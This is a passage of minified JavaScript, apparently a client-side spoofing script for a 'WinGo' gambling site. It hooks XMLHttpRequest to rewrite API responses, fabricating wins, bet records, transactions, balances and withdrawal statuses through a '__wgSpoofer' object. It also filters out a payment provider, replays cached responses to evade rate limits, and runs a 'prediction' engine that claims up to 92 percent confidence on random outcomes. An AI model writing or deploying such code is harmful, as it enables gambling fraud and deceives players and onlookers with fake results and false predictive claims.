            nextIssue: ht(f),
            list: o,
            ts: Date.now(),
          },
        }),
      );
    } catch ($) {}
  },
  GetWinLossResult: function (n, t) {
    if (!n.data) return;
    var o = String(un(t ? t._kUrl : "", "issueNumber") || "");
    if (!o) return;
    var i = un(t ? t._kUrl : "", "gameCode");
    if (!i && t && t._kUrl) {
      var c = t._kUrl.match(/\/WinGo\/([^\/?]+)(?:\/|\.json|\?|$)/);
      if (c) i = decodeURIComponent(c[1]);
    }
    var f = i || fi(o);
    if (!f) return;
    var p = kn(o, f);
    if (!p.length) return;
    var l = 0,
      v = !1,
      q = !1;
    for (var E = 0; E < p.length; E++) {
      if (Cn(p[E].rig)) q = !0;
      if (((l += p[E].rig.win || 0), p[E].rig.win > 0)) v = !0;
    }
    if (((n.data.status = v), (n.data.winAmount = v ? l : 0), q)) nn();
  },
  GetRecordPage: function (n, t) {
    var o = n.data,
      i = o && o.list;
    if (!i) return;
    var c = Mn(t ? t._kUrl : null),
      f = parseInt(un(t ? t._kUrl : "", "pageNo") || o.pageNo || 1, 10),
      p = parseInt(
        un(t ? t._kUrl : "", "pageSize") || o.pageSize || i.length || 10,
        10,
      ),
      l = {},
      v = {};
    for (var q = 0; q < i.length; q++) {
      var E = i[q],
        W = String(E.issueNumber || "");
      if (!l[W]) l[W] = kn(W, c).slice();
      var $ = l[W],
        J = -1,
        z = -1,
        O = $n(E.amount || 0, E.betMultiple || 1);
      for (var U = 0; U < $.length; U++) {
        if (String($[U].rig.content || "") !== String(E.betContent || ""))
          continue;
        var a = Ct($[U].rig.stake, O) ? 3 : 0;
        if (Math.abs(G(E.betTime) - G($[U].rig.time)) <= 120000) a += 1;
        if (a > z || (a === z && $[U].rig.time < $[J].rig.time))
          ((J = U), (z = a));
      }
      if (J < 0) continue;
      var y = $.splice(J, 1)[0];
      ((v[y.key] = !0), Rt(E, y.rig));
    }
    if (f !== 1 || !c) return;
    var e = i.slice();
    for (var u in M.rigs) {
      var w = M.rigs[u];
      if (w.game !== c || v[u]) continue;
      var Q = pi(w),
        P = $n(Q.amount, Q.betMultiple),
        Z = !1;
      for (var H = 0; H < e.length; H++) {
        var F = e[H];
        if (
          String(F.issueNumber) !== Q.issueNumber ||
          String(F.betContent) !== Q.betContent
        )
          continue;
        if (!Ct($n(F.amount || 0, F.betMultiple || 1), P)) continue;
        if (Math.abs(G(F.betTime) - G(Q.betTime)) > 1500) continue;
        Z = !0;
        break;
      }
      if (!Z) e.push(Q);
    }
    if (
      (e.sort(function (j, _) {
        return G(_.betTime) - G(j.betTime);
      }),
      e.length > p)
    )
      e = e.slice(0, p);
    if (
      ((o.list = e),
      typeof o.totalCount === "number" && o.totalCount < e.length)
    )
      o.totalCount = e.length;
    if (typeof o.totalPage === "number")
      o.totalPage = Math.max(1, Math.ceil((o.totalCount || e.length) / p));
  },
  GetTrendStatistics: function (n, t) {
    if (!n.data || !n.data.length) return;
    var o = Mn(t ? t._kUrl : null),
      i = null;
    for (var c in M.rigs) {
      var f = M.rigs[c];
      if (!f.settled || (o && f.game !== o)) continue;
      if (!i || f.time > i.time) i = f;
    }
    if (!i) return;
    var p = Wn(i.issue, i.game);
    if (p) {
      for (var l = 0; l < n.data.length; l++)
        if (G(n.data[l].number) === p.num) n.data[l].missingCount = 0;
    }
  },
  GetLoadedSetting: function (n) {
    if (n && n.data)
      ((n.data.needPopupFirstRecharge = !1),
        (n.data.isOpenActivityAward = "0"),
        (n.data.isOpenJackpotReward = "0"),
        (n.data.isTaskState = "0"));
  },
  GetFirstRechargeList: function (n) {
    if (n) n.data = [];
  },
  GetSitePopMsgList: function (n) {
    if (n) n.data = [];
  },
  GetTreasureChestPopupItems: function (n) {
    if (n) n.data = [];
  },
  GetActiveSetting: function (n) {
    if (n && n.data)
      ((n.data.isOpenActivityAward = "0"),
        (n.data.isOpenJackpotReward = "0"),
        (n.data.isTaskState = "0"),
        (n.data.unJackpotCount = 0),
        (n.data.unWeeklyAwardCount = 0),
        (n.data.newbieGiftPackCount = 0));
  },
  GetPayTypeName: function (n) {
    if (n && n.data && Array.isArray(n.data.typelist))
      n.data.typelist = n.data.typelist.filter(function (t) {
        var o = (
          (t.payName || "") +
          " " +
          (t.paySysName || "") +
          " " +
          (t.name || "")
        ).toLowerCase();
        return o.indexOf("arpay") === -1;
      });
  },
  GetRechargeTypes: function (n) {
    if (n && n.code === 0 && n.data && Array.isArray(n.data.rechargetypelist))
      ((n.data.rechargetypelist = n.data.rechargetypelist.filter(function (o) {
        var i = (
          (o.payName || "") +
          " " +
          (o.paySysName || "") +
          " " +
          (o.code || "")
        ).toLowerCase();
        return i.indexOf("arpay") === -1;
      })),
        (window.__wgRTCache = JSON.parse(JSON.stringify(n))));
    else if (
      n &&
      n.code !== 0 &&
      window.__wgRTCache &&
      /frequent|rate.?limit/i.test(n.msg || "")
    ) {
      var t = window.__wgRTCache;
      ((n.code = t.code),
        (n.msg = t.msg),
        (n.msgCode = t.msgCode),
        (n.data = t.data));
    }
  },
  GetTransactions: function (n, t) {
    if (!n.data) return;
    var o = {};
    try {
      o = JSON.parse((t && t._kBody) || "{}");
    } catch (H) {}
    var i = parseInt(o.pageNo || 1, 10),
      c = parseInt(o.pageSize || 10, 10),
      f = o.startDate || "",
      p = o.endDate || "",
      l = o.type,
      v = l === void 0 || l === "" || String(l) === "-1",
      q = f ? new Date(f + " 00:00:00").getTime() : 0,
      E = p ? new Date(p + " 23:59:59").getTime() : 1 / 0,
      W = [];
    for (var $ in M.rigs) {
      var J = M.rigs[$],
        z = G(J.time);
      if (!z || z < q || z > E) continue;
      if (!v && String(0) !== String(l)) continue;
      var O = G(J.stake);
      if (!O) O = $n(J.amount, J.betMultiple);
      W.push({
        orderNum: J.orderNo || "KG" + String(J.issue || "") + ":B",
        amount: O,
        type: 0,
        typeName: "Bet amount reduced",
        typeNameCode: "8000",
        addTime: _n(z),
        remark: "",
        _ts: z,
      });
    }
    if (!W.length) return;
    if (!n.data.list)
      n.data = { list: [], pageNo: 1, totalPage: 0, totalCount: 0 };
    var U = n.data.list || [],
      a = typeof n.data.totalCount === "number" ? n.data.totalCount : U.length,
      y = {};
    for (var e = 0; e < U.length; e++) y[U[e].orderNum] = !0;
    var u = [];
    for (var w = 0; w < W.length; w++) if (!y[W[w].orderNum]) u.push(W[w]);
    if (i === 1) {
      var Q = u.slice(0);
      for (var P = 0; P < U.length; P++)
        ((U[P]._ts = new Date(U[P].addTime || 0).getTime() || 0), Q.push(U[P]));
      Q.sort(function (H, F) {
        return (F._ts || 0) - (H._ts || 0);
      });
      for (var Z = 0; Z < Q.length; Z++) delete Q[Z]._ts;
      n.data.list = Q.slice(0, c);
    }
    ((n.data.totalCount = a + u.length),
      (n.data.totalPage = Math.max(1, Math.ceil(n.data.totalCount / c))),
      (n.data.pageNo = i));
  },
};
function dn(n) {
  try {
    return new Event(n);
  } catch (o) {}
  try {
    var t = document.createEvent("Event");
    return (t.initEvent(n, !1, !1), t);
  } catch (o) {}
  return null;
}
function nt(n, t, o) {
  setTimeout(function () {
    try {
      Object.defineProperty(n, "readyState", { value: 4, configurable: !0 });
    } catch (p) {
      try {
        n.readyState = 4;
      } catch (l) {}
    }
    try {
      Object.defineProperty(n, "status", { value: 200, configurable: !0 });
    } catch (p) {
      try {
        n.status = 200;
      } catch (l) {}
    }
    try {
      Object.defineProperty(n, "responseText", { value: t, configurable: !0 });
    } catch (p) {
      try {
        n.responseText = t;
      } catch (l) {}
    }
    try {
      Object.defineProperty(n, "response", { value: t, configurable: !0 });
    } catch (p) {
      try {
        n.response = t;
      } catch (l) {}
    }
    try {
      if (typeof n.onreadystatechange === "function") n.onreadystatechange();
    } catch (p) {}
    var i = dn("readystatechange");
    if (i)
      try {
        n.dispatchEvent(i);
      } catch (p) {}
    try {
      if (typeof n.onload === "function") n.onload();
    } catch (p) {}
    var c = dn("load");
    if (c)
      try {
        n.dispatchEvent(c);
      } catch (p) {}
    try {
      if (typeof n.onloadend === "function") n.onloadend();
    } catch (p) {}
    var f = dn("loadend");
    if (f)
      try {
        n.dispatchEvent(f);
      } catch (p) {}
  }, o || 10);
}
var tt = Object.keys(Kn).sort(function (n, t) {
  return t.length - n.length;
});
function ei(n) {
  var t = typeof n === "string" ? n : "";
  if (ti(t)) return "WinGoState";
  for (var o = 0; o < tt.length; o++) if (t.indexOf(tt[o]) !== -1) return tt[o];
  return null;
}
var Kt = {},
  yi = 1e4;
function Dt(n) {
  try {
    var t = JSON.parse(n || "{}");
    return "RT:" + (t.payid || 0);
  } catch (o) {
    return "RT:0";
  }
}
var gt = {},
  vi = 60000;
function ai(n, t) {
  try {
    var o = JSON.parse(t || "{}");
    (delete o.signature, delete o.random, delete o.timestamp);
    var i = Object.keys(o).sort(),
      c = "";
    for (var f = 0; f < i.length; f++) c += i[f] + "=" + o[i[f]] + "&";
    return n + ":" + c;
  } catch (p) {
    return n;
  }
}
var mt = {
    GetUserInfo: 1,
    GetBalance: 1,
    GetWealthState: 1,
    GetVipUsers: 1,
    GetARGameAndPlatWallets: 1,
    GetTreasureChestPopupItems: 1,
    GetActiveSetting: 1,
    GetHomeSettings: 1,
    GetLoadedSetting: 1,
    GetDailyProfitRank: 1,
    GetPwaDomainList: 1,
    NotifyARGameRecover: 1,
    GetSiteMessageList: 1,
    GetRechargeTypes: 1,
    GetSitePopMsgList: 1,
    GetGameCategoryList: 1,
    GetAllGameList: 1,
    GetBannerList: 1,
    GetSaasAllwallets: 1,
    RecoverSaasBalance: 1,
  },
  an = {},
  ui = 2000,
  wi = mt;
function qi(n, t) {
  try {
    var o = JSON.parse(t || "{}");
    return (
      n +
      ":" +
      (o.pageNo || 0) +
      ":" +
      (o.pageSize || 0) +
      ":" +
      (o.payid || 0) +
      ":" +
      (o.gameCode || "")
    );
  } catch (i) {
    return n;
  }
}
function Tt() {
  var n = Nt();
  (setInterval(function () {
    n = Nt();
  }, 5000),
    zn());
  var t = XMLHttpRequest.prototype.open,
    o = XMLHttpRequest.prototype.send;
  ((XMLHttpRequest.prototype.open = function (i, c) {
    if (!n) return t.apply(this, arguments);
    return ((this._kUrl = c), (this._kEp = ei(c)), t.apply(this, arguments));
  }),
    (XMLHttpRequest.prototype.send = function (i) {
      if (!n) return o.apply(this, arguments);
      if (this._kEp === "GetRechargeTypes") {
        var c = Dt(i),
          f = Kt[c];
        if (f && Date.now() - f.ts < yi) {
          nt(this, f.json, 10);
          return;
        }
      }
      if (this._kEp && wi[this._kEp]) {
        var p = qi(this._kEp, i),
          l = an[p];
        if (l && Date.now() - l.ts < ui) {
          ((this._kBody = i), l.xhrs.push(this));
          return;
        }
        ((this._kDedupKey = p),
          (an[p] = { xhrs: [], ts: Date.now() }),
          setTimeout(function () {
            var J = an[p];
            if (J) {
              for (var z = 0; z < J.xhrs.length; z++)
                nt(
                  J.xhrs[z],
                  '{"code":-1,"data":null,"msg":"dedup timeout","msgCode":-1}',
                  0,
                );
              delete an[p];
            }
          }, 1e4));
      }
      if (this._kEp) {
        let J = function () {
          if (E || v.readyState !== 4) return;
          try {
            var z =
              v.responseText ||
              (typeof v.response === "string" ? v.response : "");
            if (!z) return;
            var O = JSON.parse(z);
            Kn[q](O, v);
            var U = JSON.stringify(O);
            if (
              (Object.defineProperty(v, "responseText", {
                value: U,
                configurable: !0,
              }),
              Object.defineProperty(v, "response", {
                value: U,
                configurable: !0,
              }),
              (E = !0),
              q === "GetRechargeTypes" && O.code === 0)
            )
              Kt[Dt(v._kBody)] = { json: U, ts: Date.now() };
            var a = ai(q, v._kBody);
            if (O.code === 0) gt[a] = { json: U, ts: Date.now() };
            else if (
              mt[q] &&
              (O.code === 313 ||
                O.msgCode === 313 ||
                /frequent|rate.?limit/i.test(O.msg || ""))
            ) {
              var y = gt[a];
              if (y && Date.now() - y.ts < vi)
                ((U = y.json),
                  Object.defineProperty(v, "responseText", {
                    value: U,
                    configurable: !0,
                  }),
                  Object.defineProperty(v, "response", {
                    value: U,
                    configurable: !0,
                  }));
            }
            if (v._kDedupKey) {
              var e = an[v._kDedupKey];
              if (e) {
                for (var u = 0; u < e.xhrs.length; u++) nt(e.xhrs[u], U, 5);
                delete an[v._kDedupKey];
              }
            }
          } catch (w) {}
        };
        this._kBody = i;
        var v = this,
          q = this._kEp,
          E = !1,
          W = v.onreadystatechange,
          $ = v.onload;
        ((v.onreadystatechange = function () {
          if ((J(), typeof W === "function")) return W.apply(this, arguments);
        }),
          (v.onload = function () {
            if ((J(), typeof $ === "function")) return $.apply(this, arguments);
          }),
          v.addEventListener("readystatechange", J),
          v.addEventListener("load", J));
      }
      return o.apply(this, arguments);
    }),
    (window.__kismatAccuracy = T("accuracy", 70)),
    (window.__kismatRigMap = window.__kismatRigMap || {}),
    (window.__wgSpoofer = {
      getSettings: function () {
        return {
          accuracy: T("accuracy", 70),
          balanceOffset: T("balanceOffset", 5000),
        };
      },
      saveSetting: function (i, c) {
        var f = Vt();
        if (
          ((f[i] = c),
          localStorage.setItem("wg_spoof_cfg", JSON.stringify(f)),
          i === "accuracy")
        )
          window.__kismatAccuracy = c;
      },
      resetBalance: function () {
        ((M.balance = null),
          (M.balance = T("balanceOffset", 5000)),
          nn(),
          ct());
      },
      getWithdrawals: function () {
        return M.withdrawals;
      },
      updateWithdrawalStatus: function (i, c) {
        if (M.withdrawals[i]) ((M.withdrawals[i].state = c), nn());
      },
      predictNum: Dn,
      rigHash: At,
      colors: ot,
      isVip: function () {
        return n;
      },
    }));
}
function Si(n) {
  let t = parseInt(n);
  return {
    num: t,
    big: t >= 5,
    color: t === 0 || t === 5 ? "violet" : t % 2 === 0 ? "red" : "green",
  };
}
function lt(n, t) {
  if (n.length < 2) return { len: 0, val: null };
  let o = n[0][t],
    i = 1;
  for (let c = 1; c < n.length; c++)
    if (n[c][t] === o) i++;
    else break;
  return { len: i, val: o };
}
function Ei(n, t, o) {
  let i = {};
  return (
    n.slice(0, o).forEach((c) => {
      i[c[t]] = (i[c[t]] || 0) + 1;
    }),
    i
  );
}
function It(n) {
  if (n.len >= 3)
    return { side: !n.val, conf: Math.min(0.15 + n.len * 0.08, 0.45) };
  if (n.len >= 2) return { side: !n.val, conf: 0.1 };
  return { side: null, conf: 0 };
}
function jt(n, t = 10) {
  let o = Ei(n, "big", t),
    i = o[!0] || 0,
    c = o[!1] || 0,
    f = i + c;
  if (f < 5) return { side: null, conf: 0 };
  let p = i / f;
  if (p >= 0.7) return { side: !1, conf: 0.12 };
  if (p <= 0.3) return { side: !0, conf: 0.12 };
  return { side: null, conf: 0 };
}
function xt(n, t = 12) {
  let o = Math.min(t, n.length);
  if (o < 4) return { side: null, conf: 0 };
  let i = 0,
    c = 0;
  for (let p = 0; p < o; p++) {
    let l = o - p;
    ((i += (n[p].big ? 1 : -1) * l), (c += l));
  }
  let f = c ? i / c : 0;
  if (Math.abs(f) < 0.08) return { side: null, conf: 0 };
  return { side: f > 0, conf: Math.min(Math.abs(f) * 0.22, 0.18) };
}
function kt(n, t = 24) {
  if (n.length < 6) return { side: null, conf: 0 };
  let o = n[0].big,
    i = 0,
    c = 0,
    f = Math.min(t, n.length - 1);
  for (let v = 0; v < f; v++) {
    let q = n[v + 1],
      E = n[v];
    if (q.big !== o) continue;
    if (E.big === o) i++;
    else c++;
  }
  let p = i + c;
  if (p < 3) return { side: null, conf: 0 };
  let l = i / p;
  if (l >= 0.67) return { side: o, conf: Math.min((l - 0.5) * 0.45, 0.18) };
  if (l <= 0.33) return { side: !o, conf: Math.min((0.5 - l) * 0.45, 0.18) };
  return { side: null, conf: 0 };
}
function st(n, t = 6) {
  let o = n.slice(0, t);
  if (o.length < 4) return { side: null, conf: 0 };
  let i = o.reduce((c, f) => c + f.num, 0) / o.length;
  if (i >= 6.1) return { side: !0, conf: 0.08 };
  if (i <= 3.9) return { side: !1, conf: 0.08 };
  return { side: null, conf: 0 };
}
function _t(n) {
  if (n.length < 4) return { detected: !1, conf: 0 };
  let t = 0,
    o = Math.min(6, n.length - 1);
  for (let i = 0; i < o; i++) if (n[i].big !== n[i + 1].big) t++;
  if (t / o >= 0.8) return { detected: !0, nextSide: !n[0].big, conf: 0.15 };
  return { detected: !1, conf: 0 };
}
function Ui(n) {
  let t = _t(n);
  return t.detected
    ? { side: t.nextSide, conf: t.conf }
    : { side: null, conf: 0 };
}
function $i(n) {
  let t = lt(n, "color");
  if (t.len >= 4 && t.val !== "violet")
    return { color: t.val === "red" ? "green" : "red", conf: 0.1 };
  return { color: null, conf: 0 };
}
function rt(n, t = 2, o = 28) {
  if (n.length < t + 4) return { side: null, conf: 0 };
  let i = n
      .slice(0, t)
      .map((q) => (q.big ? 1 : 0))
      .join(""),
    c = 0,
    f = 0,
    p = 0,
    l = Math.min(o, n.length - t - 1);
  for (let q = 1; q <= l; q++) {
    if (
      n
        .slice(q, q + t)
        .map((J) => (J.big ? 1 : 0))
        .join("") !== i
    )
      continue;
    let W = n[q - 1].big,
      $ = l - q + 1;
    ((c += (W ? 1 : -1) * $), (f += $), p++);
  }
  if (p < 2 || !f) return { side: null, conf: 0 };
  let v = c / f;
  if (Math.abs(v) < 0.12) return { side: null, conf: 0 };
  return { side: v > 0, conf: Math.min(Math.abs(v) * 0.32, 0.24) };
}
function Mi(n, t = 20) {
  let o = {};
  n.slice(0, t).forEach((c) => {
    o[c.num] = (o[c.num] || 0) + 1;
  });
  let i = Object.entries(o).sort((c, f) => f[1] - c[1]);
  return {
    hot: i.slice(0, 3).map((c) => parseInt(c[0])),
    cold: i.slice(-3).map((c) => parseInt(c[0])),
  };
}
function Oi(n) {
  let t = [],
    o = 0,
    i = xt(n);
  if (i.conf > 0)
    ((o += i.side ? i.conf : -i.conf),
      t.push({ name: "momentum", type: "trend", weight: i.conf }));
  let c = kt(n);
  if (c.conf > 0)
    ((o += c.side ? c.conf : -c.conf),
      t.push({ name: "transition", type: "flow", weight: c.conf }));
  let f = lt(n, "big"),
    p = It(f);
  if (p.conf > 0)
    ((o += p.side ? p.conf : -p.conf),
      t.push({
        name: f.val ? "Big" : "Small",
        type: "streak",
        len: f.len,
        weight: p.conf,
      }));
  let l = jt(n);
  if (l.conf > 0)
    ((o += l.side ? l.conf : -l.conf),
      t.push({ name: "frequency", type: "bias", weight: l.conf }));
  let v = st(n);
  if (v.conf > 0)
    ((o += v.side ? v.conf : -v.conf),
      t.push({ name: "pressure", type: "numbers", weight: v.conf }));
  let q = _t(n);
  if (q.detected)
    ((o += q.nextSide ? q.conf : -q.conf),
      t.push({ name: "alternating", type: "pattern", weight: q.conf }));
  return { bigScore: o, signals: t, streak: f };
}
function Ji(n, t, o = 24) {
  let i = 0,
    c = 0,
    f = 0,
    p = Math.min(o, t.length - 4);
  for (let l = 1; l <= p; l++) {
    let v = n(t.slice(l));
    if (!v || v.side == null || !v.conf) continue;
    let q = t[l - 1].big,
      E = p - l + 1;
    ((i += (v.side === q ? 1 : -1) * v.conf * E), (c += v.conf * E), f++);
  }
  return { edge: c ? i / c : 0, count: f };
}
var Wi = [
  { name: "memory-2", type: "memory", run: (n) => rt(n, 2, 28), minCount: 3 },
  { name: "memory-3", type: "memory", run: (n) => rt(n, 3, 36), minCount: 2 },
  { name: "momentum", type: "trend", run: xt, minCount: 4 },
  { name: "transition", type: "flow", run: kt, minCount: 4 },
  { name: "revert", type: "streak", run: (n) => It(lt(n, "big")), minCount: 4 },
  { name: "hot-cold", type: "bias", run: jt, minCount: 4 },
  { name: "pressure", type: "numbers", run: st, minCount: 4 },
  { name: "alternating", type: "pattern", run: Ui, minCount: 3 },
];
function Ln(n) {
  if (!n || n.length < 3)
    return {
      prediction: "Big",
      confidence: 54,
      color: "green",
      signals: [],
      heatmap: { hot: [], cold: [] },
      topNumber: 7,
    };
  let t = n.map((z) => Si(z.number || z.num || z)),
    o = Mi(t),
    i = $i(t),
    c = Oi(t),
    f = [],
    p = 0,
    l = 0;
  for (let z of Wi) {
    let O = z.run(t);
    if (!O || O.side == null || !O.conf) continue;
    let U = Ji(z.run, t, 24);
    if (U.count < z.minCount) continue;
    let a = O.side,
      y = Math.min(Math.abs(U.edge), 0.45) * (0.7 + O.conf);
    if (U.edge < -0.18) ((a = !a), (y *= 0.6));
    else if (U.edge < 0.05) continue;
    ((p += (a ? 1 : -1) * y),
      (l += y),
      f.push({
        name: z.name,
        type: z.type,
        weight: Number(y.toFixed(3)),
        edge: Number(U.edge.toFixed(3)),
        mode: a === O.side ? "direct" : "flip",
      }));
  }
  let v = l ? p : c.bigScore,
    q = v >= 0,
    E = Math.round(
      Math.min(
        Math.max(
          l ? 0.53 + Math.abs(v) * 0.62 + Math.min(l, 0.18) : 0.5 + Math.abs(v),
          0.54,
        ),
        0.92,
      ) * 100,
    ),
    W = i.color ?? (q ? "red" : "green"),
    $ = o.hot.find((z) => (q ? z >= 5 : z < 5)) ?? (q ? 7 : 3),
    J = (f.length ? f : c.signals)
      .sort((z, O) => (O.weight || 0) - (z.weight || 0))
      .slice(0, 4);
  return {
    prediction: q ? "Big" : "Small",
    confidence: E,
    color: W,
    signals: J,
    heatmap: o,
    topNumber: $,
    streak: { side: c.streak.val ? "Big" : "Small", len: c.streak.len },
  };
}
var zi = [
    "053d2b99",
    "49176bf8",
    "62fbe730",
    "31762cc1",
    "ba9fa4ff",
    "46891538",
    "9319baa4",
    "4e868eee",
    "832f9a99",
    "9cf62e12",
  ],
  ft = Object.create(null),
  g = qn(),
  dt = to(g),
  Qn = null,
  gn = null,
  Vn = null;
function Li() {
  let n = {};
  for (let t of document.styleSheets) {
    let o;
    try {
      o = t.cssRules;
    } catch (i) {
      continue;
    }
    for (let i of o || []) {
      let c = (i.cssText || "").match(/ball_(\d)-[\w-]+\.(?:png|webp)/);
      if (c && !n[c[1]]) n[c[1]] = c[0];
    }
  }
  return n;
}
function no(n) {
  if (!Vn || !Vn[n]) Vn = Li();
  return "/assets/png/" + (Vn[n] || "ball_" + n + "-" + zi[n] + ".webp");
}
function r(n = g) {
  if (((n = n || "WinGo_30S"), !ft[n]))
    ft[n] = { history: [], issue: "", latestIssue: "", lastSec: -1 };
  return ft[n];
}
function Qi(n) {
  if (
    ((n = String(n || "")
      .toLowerCase()
      .replace(/\s+/g, "")),
    n.includes("wingo30"))
  )
    return "WinGo_30S";
  if (n.includes("wingo1min") || n.includes("wingo1m")) return "WinGo_1M";
  if (n.includes("wingo3min") || n.includes("wingo3m")) return "WinGo_3M";
  if (n.includes("wingo5min") || n.includes("wingo5m")) return "WinGo_5M";
  return "";
}
function qn() {
  let n = document.querySelector(
      ".timer-card.active .card-title, .TimeLeft__C-name",
    ),
    t = Qi(n && n.textContent);
  if (t) return t;
  let o = (location.hash || "").match(/gameCode=(WinGo_\w+)/);
  return o ? o[1] : "WinGo_30S";
}
function to(n) {
  if (!n) return 30;
  let t = n.match(/(\d+)M$/i);
  if (t) return parseInt(t[1], 10) * 60;
  let o = n.match(/(\d+)S$/i);
  if (o) return parseInt(o[1], 10);
  return 30;
}
function k(n) {
  let t = String(n == null ? "" : n).trim();
  return /^\d{8,22}$/.test(t) ? t : "";
}
function pt(n) {
  if (((n = k(n)), !n)) return "";
  try {
    return (BigInt(n) + 1n).toString();
  } catch (t) {
    return "";
  }
}
function oo(n, t) {
  if (((n = k(n)), (t = k(t)), !n || !t)) return 0;
  try {
    let o = BigInt(n),
      i = BigInt(t);
    return o > i ? 1 : o < i ? -1 : 0;
  } catch (o) {
    return n > t ? 1 : n < t ? -1 : 0;
  }
}
function Pn() {
  let n = qn();
  if (n && n !== g) at(n);
}
function io(n) {
  return ((n = n || g || "WinGo_30S"), (g = n), (dt = to(n)), r(n), n);
}
function et() {
  return document.querySelector("prediction-panel")?.shadowRoot;
}
function Zn() {
  return !!et()?.querySelector(".view-pro.active");
}
function Bn() {
  return g;
}
function yt() {
  return r().history;
}
function co() {
  return r().issue;
}
function lo() {
  return r().latestIssue;
}
function fo(n) {
  r().lastSec = n;
}
function vt(n) {
  if (!n) return "—";
  return n
    .replace(/^WinGo_/, "")
    .replace(/(\d+)S$/i, "$1sec")
    .replace(/(\d+)M$/i, "$1m");
}
function pn(n) {
  let t = et();
  if (!t) return;
  let o = t.querySelector("#pro-waiting"),
    i = t.querySelector("#pro-prediction"),
    c = t.querySelector("#pro-card"),
    f = t.querySelector("#scan-lbl");
  if (!o || !i || !c) return;
  if (n === "result") {
    ((o.style.display = "none"),
      (i.style.display = "block"),
      c.classList.remove("shimmer"));
    return;
  }
  if (
    ((o.style.display = "flex"),
    (i.style.display = "none"),
    (c.className = c.className.replace(/\bc-\w+\b/g, "").trim() + " shimmer"),
    f && f.childNodes[0])
  )
    f.childNodes[0].textContent = n === "analyzing" ? "Analyzing" : "Scanning";
}
function po(n, t) {
  if (!Array.isArray(t) || !t.length) return;
  n = n || qn() || g;
  let o = k(t[0].issueNumber ?? t[0].issue);
  if (!o) return;
  let i = r(n);
  ((i.history = t), (i.latestIssue = o));
  let c = pt(o);
  if (c && (!i.issue || oo(i.issue, o) <= 0)) i.issue = c;
  if (n !== g || !Zn()) return;
  setTimeout(() => Qn?.(), 0);
}
function eo(n, t, o) {
  n = n || qn() || g;
  let i = r(n),
    c = k(t) || k(o) || pt(t);
  if (!c) return;
  if (
    !i.issue ||
    c !== i.issue ||
    (i.latestIssue && oo(i.issue, i.latestIssue) <= 0)
  ) {
    if (((i.issue = c), n === g && Zn())) setTimeout(() => Qn?.(), 0);
  }
}
function en() {
  let n = g;
  if (!n) return;
  let t = new XMLHttpRequest();
  (t.open("GET", "/WinGo/" + n + "/GetHistoryIssuePage.json?ts=" + Date.now()),
    t.send());
}
function yo(n, t) {
  Pn();
  let o = n || g;
  (po(o, t?.data?.list),
    eo(
      o,
      t?.current?.issueNumber || t?.data?.current?.issueNumber,
      t?.next?.issueNumber || t?.data?.next?.issueNumber,
    ));
}
function Pi(n) {
  let t = n.detail;
  if (!t || t.type !== "history") return;
  (Pn(), po(t.game || g, t.list));
}
function Zi(n) {
  let t = n.detail;
  if (!t) return;
  (Pn(), eo(t.game || g, t.currentIssue, t.nextIssue));
}
function vo() {
  if (gn) return;
  gn = setInterval(() => {
    if (!Zn() || r().history.length) {
      (clearInterval(gn), (gn = null));
      return;
    }
    en();
  }, 3000);
}
function Xi() {
  let n = et();
  if (!n?.querySelector(".view-pro.active")) return;
  Pn();
  let t = g,
    o = r(t),
    i = document.querySelector(".TimeLeft__C-time"),
    c = document.querySelector(".TimeLeft__C-id"),
    f = document.querySelector(".TimeLeft__C-name"),
    p = n.querySelector("#pro-timer"),
    l = n.querySelector("#pro-timer-wrap");
  if (!p || !l) return;
  if (i) {
    let q = i.textContent.trim();
    p.textContent = q;
    let E = q.split(":"),
      W = (parseInt(E[0], 10) || 0) * 60 + (parseInt(E[1], 10) || 0);
    if (
      (l.style.setProperty(
        "--pct",
        Math.max(0, Math.min(100, (W / dt) * 100)) + "%",
      ),
      p.classList.remove("t-warn", "t-end"),
      l.classList.remove("tw-warn", "tw-end"),
      W <= 5)
    )
      (p.classList.add("t-end"), l.classList.add("tw-end"));
    else if (W <= 10) (p.classList.add("t-warn"), l.classList.add("tw-warn"));
    if (o.lastSec >= 0 && o.lastSec <= 4 && W > o.lastSec + 5)
      setTimeout(en, 250);
    o.lastSec = W;
  }
  if (c) {
    let q = String(c.textContent).trim(),
      E = k(q);
    if (E && o.issue !== E) ((o.issue = E), setTimeout(() => Qn?.(), 0));
    let W = n.querySelector("#pro-period"),
      $ = k(o.issue) || E || q;
    if (W) W.textContent = "#" + $.slice(-6);
  }
  let v = n.querySelector("#pro-mode");
  if (v) v.textContent = f?.textContent.trim() || vt(t);
}
function ao({ onPred: n }) {
  (io(qn()),
    (Qn = n),
    window.addEventListener("kismat:gameData", Pi),
    window.addEventListener("kismat:issue", Zi),
    window.addEventListener("hashchange", Pn),
    setInterval(Xi, 300),
    setInterval(() => {
      if (Zn()) en();
    }, 12000));
}
function at(n) {
  if (((n = n || qn()), !n)) return;
  let t = n !== g;
  io(n);
  let o = r(n),
    c =
      k(document.querySelector(".TimeLeft__C-id")?.textContent) ||
      pt(o.latestIssue),
    f = !!(o.history.length && c && o.issue === c);
  if (c) o.issue = c;
  if (((o.lastSec = -1), !t)) return;
  if (Zn()) {
    if (!f) pn("loading");
    else setTimeout(() => Qn?.(), 0);
    en();
  }
}
function uo(n, t) {
  return Math.max(0, Math.min(n, window.innerWidth - t));
}
function wo(n, t) {
  return Math.max(0, Math.min(n, window.innerHeight - t));
}
function An(n) {
  try {
    let t = JSON.parse(localStorage.getItem("__wg_p_" + n));
    if (t) return t;
  } catch (t) {}
  if (n === "logo")
    return { vw: ((window.innerWidth - 68) / window.innerWidth) * 100, vh: 75 };
  return null;
}
function ut(n, t) {
  localStorage.setItem(
    "__wg_p_" + t,
    JSON.stringify({
      vw: (n.offsetLeft / window.innerWidth) * 100,
      vh: (n.offsetTop / window.innerHeight) * 100,
    }),
  );
}
function bn(n, t) {
  if (!t) return;
  ((n.style.left = (t.vw / 100) * window.innerWidth + "px"),
    (n.style.top = (t.vh / 100) * window.innerHeight + "px"));
}
function qo(n, t) {
  let o = t.offsetWidth || 288,
    i = t.offsetHeight || 290;
  ((n.style.left = (window.innerWidth - o) / 2 + "px"),
    (n.style.top = (window.innerHeight - i) / 2 + "px"));
}
function So(n, t, { onTap: o }) {
  let i = 0,
    c = 0,
    f = 0,
    p = 0,
    l = !1;
  (t.addEventListener("pointerdown", (v) => {
    (t.setPointerCapture(v.pointerId),
      t.classList.add("dragging"),
      (i = v.clientX - n.offsetLeft),
      (c = v.clientY - n.offsetTop),
      (f = v.clientX),
      (p = v.clientY),
      (l = !1));
  }),
    t.addEventListener("pointermove", (v) => {
      if (!t.hasPointerCapture(v.pointerId)) return;
